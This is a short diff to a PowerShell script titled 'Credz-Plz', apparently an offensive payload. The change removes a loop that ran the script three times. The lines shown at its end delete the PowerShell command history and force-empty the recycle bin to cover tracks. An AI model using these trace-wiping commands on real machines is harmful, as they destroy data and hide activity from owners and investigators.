@@ -1,5 +1,3 @@
-for ($i=1; $i -le 3; $i++) {
-
 ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
@@ -226,5 +224,3 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 exit
-
-}
